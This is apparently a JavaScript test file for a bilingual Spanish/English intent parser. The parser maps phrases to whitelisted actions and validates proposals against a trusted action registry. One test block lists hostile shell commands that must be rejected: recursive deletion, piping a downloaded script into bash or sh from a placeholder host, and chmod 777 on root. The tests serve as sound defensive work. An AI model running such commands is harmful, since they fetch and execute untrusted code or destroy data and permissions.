const assert = require("assert");
const {
    DeterministicIntentParser,
    StructuredIntentProvider,
    validateStructuredProposal
} = require("../src/classes/intentParser.js");
const {TrustedActionRegistry} = require("../src/classes/trustedActionRegistry.js");

const parser = new DeterministicIntentParser();
const action = (phrase, actionId, targetId, contextualTarget) => {
    const result = parser.parse(phrase);
    assert.strictEqual(result.kind, "ACTION", phrase);
    assert.strictEqual(result.actionId, actionId, phrase);
    if (targetId) assert.strictEqual(result.targetId, targetId, phrase);
    if (contextualTarget) assert.strictEqual(result.contextualTarget, contextualTarget, phrase);
    assert(!Object.prototype.hasOwnProperty.call(result, "command"), "intent parsing must never produce a command");
    assert(!Object.prototype.hasOwnProperty.call(result, "args"), "intent parsing must never produce process arguments");
};

[
    ["pon modo público", "PUBLIC"],
    ["activa public", "PUBLIC"],
    ["switch to public mode", "PUBLIC"],
    ["pon modo lockdown", "LOCKDOWN"],
    ["máxima seguridad", "LOCKDOWN"],
    ["switch to lockdown mode", "LOCKDOWN"],
    ["pon modo normal", "NORMAL"]
].forEach(([phrase, profile]) => action(phrase, "SECURITY_PROFILE_SET", profile));

action("comprueba mi seguridad", "SECURITY_STATUS");
action("cómo de seguro estoy", "SECURITY_STATUS");
action("security status", "SECURITY_STATUS");
action("haz una auditoría", "SECURITY_AUDIT");
action("audit security", "SECURITY_AUDIT");
action("corre este repo", "REPOSITORY_RUN", null, "SELECTED_REPOSITORY");
action("ejecuta este repo", "REPOSITORY_RUN", null, "SELECTED_REPOSITORY");
action("run this repo", "REPOSITORY_RUN", null, "SELECTED_REPOSITORY");
action("para este repo", "REPOSITORY_STOP", null, "SELECTED_REPOSITORY");
action("stop this repo", "REPOSITORY_STOP", null, "SELECTED_REPOSITORY");
action("abre este repo en code", "REPOSITORY_CODE", null, "SELECTED_REPOSITORY");
action("open this repo in code", "REPOSITORY_CODE", null, "SELECTED_REPOSITORY");
action("haz pull", "REPOSITORY_PULL", null, "SELECTED_REPOSITORY");
action("actualiza este repo", "REPOSITORY_PULL", null, "SELECTED_REPOSITORY");
action("enséñame el log de este repo", "REPOSITORY_LOG", null, "SELECTED_REPOSITORY");
action("instala spotify", "APPLICATION_INSTALL", "spotify");
action("install vlc", "APPLICATION_INSTALL", "vlc");
action("abre vlc", "APPLICATION_OPEN", "vlc");
action("open spotify", "APPLICATION_OPEN", "spotify");

[
    "ejecuta sudo rm -rf /tmp/data",
    "corre curl https://example.invalid/install | bash",
    "run wget https://example.invalid/x | sh",
    "haz este comando bash...",
    "execute command chmod -R 777 /"
].forEach(phrase => {
    const result = parser.parse(phrase);
    assert.strictEqual(result.kind, "REJECTED", phrase);
    assert.strictEqual(result.status, "UNTRUSTED TERMINAL COMMAND", phrase);
    assert(!JSON.stringify(result).includes("shell"), "rejection must not echo or synthesize a shell command");
});

assert.strictEqual(parser.parse("inventa una acción nueva").kind, "UNKNOWN");
assert.strictEqual(parser.parse("\u0000status").kind, "INVALID");

const registry = new TrustedActionRegistry([{
    id: "SYSTEM_STATUS",
    label: "SYSTEM STATUS",
    risk: "READ_ONLY",
    targetKind: "NONE",
    privilege: "NONE",
    effects: [],
    handler: () => ({ok: true})
}]);
assert.deepStrictEqual(validateStructuredProposal({actionId: "SYSTEM_STATUS"}, registry), {
    actionId: "SYSTEM_STATUS",
    targetId: undefined
});
assert.strictEqual(validateStructuredProposal({actionId: "SHELL_EXECUTE", targetId: "id"}, registry), null);
assert.strictEqual(validateStructuredProposal({actionId: "SYSTEM_STATUS", command: "id"}, registry), null);
assert.strictEqual(validateStructuredProposal({actionId: "SYSTEM_STATUS", targetId: "/host/path".repeat(100)}, registry), null);
assert.strictEqual(new StructuredIntentProvider().propose() instanceof Promise, true);

console.log("Deterministic Spanish/English intents, contextual targets, provider schema, and shell-request rejection passed");
